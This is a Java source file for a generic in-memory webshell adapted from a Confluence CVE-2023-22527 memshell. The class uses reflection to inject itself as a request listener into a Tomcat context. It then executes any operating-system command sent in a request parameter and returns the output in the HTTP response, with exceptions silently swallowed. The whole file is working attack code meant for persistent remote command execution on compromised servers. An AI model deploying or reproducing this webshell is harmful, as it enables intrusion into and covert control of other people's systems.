import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.io.PrintWriter;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.DataInputStream;
import javax.servlet.*;

// Original code was taken from: https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL/blob/main/src/main/ConfluenceFilterMemshell.java
// But adapted to be a generic webshell and look more like https://medium.com/@m01e/jsp-webshell-cookbook-part-3-f2a96f3b81ad
//
// This code depends on servlet-api.jar (Tomcat 9.0) for javax
public class ABCDEFG implements ServletRequestListener {

    public ABCDEFG(ServletContext context) {
        try {
            addListener(this, getFieldValue(getFieldValue(context,"context"), "context"));
        } catch (Throwable e) {
        }
    }

    private void addListener(Object listener, Object standardContext) throws Exception {
        Method addApplicationEventListenerMethod = standardContext.getClass().getDeclaredMethod("addApplicationEventListener", Object.class);
        addApplicationEventListenerMethod.setAccessible(true);
        addApplicationEventListenerMethod.invoke(standardContext, listener);
    }

    @Override
    public void requestInitialized(ServletRequestEvent sret) {
        try {
            ServletRequest request = sret.getServletRequest();
            String cmd = request.getParameter("AAAAAAAAAAAA");
            if (cmd != null) {
                ServletResponse response = (ServletResponse)getFieldValue(getFieldValue(request, "request"), "response");
                PrintWriter printWriter = response.getWriter();
                Process p = Runtime.getRuntime().exec(cmd);
                OutputStream os = p.getOutputStream();
                InputStream in = p.getInputStream();
                DataInputStream dis = new DataInputStream( in );
                String disr = dis.readLine();
                while (disr != null) {
                    printWriter.write(disr);
                    disr = dis.readLine();
                }
                printWriter.flush();
                printWriter.close();
            }
        }
        catch (Exception e) {
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f = null;
        if (obj instanceof Field) {
            f = (Field) obj;
        } else {
            Method method = null;
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f.setAccessible(true);
        return f.get(obj);
    }
}